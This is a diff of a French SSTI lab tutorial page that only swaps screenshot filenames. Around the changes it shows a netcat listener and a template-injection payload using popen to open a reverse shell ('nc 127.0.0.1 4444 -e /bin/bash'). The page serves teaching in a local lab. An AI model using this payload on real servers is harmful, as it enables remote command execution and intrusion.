@@ -1246,7 +1246,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">Terminal — Listener nc -lvnp 4444</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/app4.jpg" alt="Listener netcat démarré sur le port 4444" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/nc.jpg" alt="Listener netcat démarré sur le port 4444" loading="lazy"></div>
             <div class="terminal-caption">Ncat en écoute — prêt à recevoir la connexion sortante de la cible</div>
           </div>
         </div>
@@ -1272,7 +1272,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">?name={{joiner...popen('nc 127.0.0.1 4444 -e /bin/bash').read()}}</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/app5.jpg" alt="URL du payload reverse shell dans le navigateur" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/rce2.jpg" alt="URL du payload reverse shell dans le navigateur" loading="lazy"></div>
             <div class="terminal-caption">Payload envoyé via le paramètre GET <code>name</code> — le serveur exécute la commande via <code>os.popen()</code></div>
           </div>
 
@@ -1283,7 +1283,7 @@ mkdir ssti-lab && cd ssti-lab</pre>
               <div class="t-dot t-dot-green"></div>
               <span class="terminal-bar-label">Terminal — Shell connecté</span>
             </div>
-            <div class="img-scroll"><img src="../ssti1/app6.jpg" alt="Shell interactif reçu — whoami et ifconfig exécutés avec succès" loading="lazy"></div>
+            <div class="img-scroll"><img src="../ssti1/rce1.jpg" alt="Shell interactif reçu — whoami et ifconfig exécutés avec succès" loading="lazy"></div>
             <div class="terminal-caption">Shell connecté sur le listener — <code>whoami</code> → spectrax · <code>ifconfig</code> → dump des interfaces réseau</div>
           </div>
 
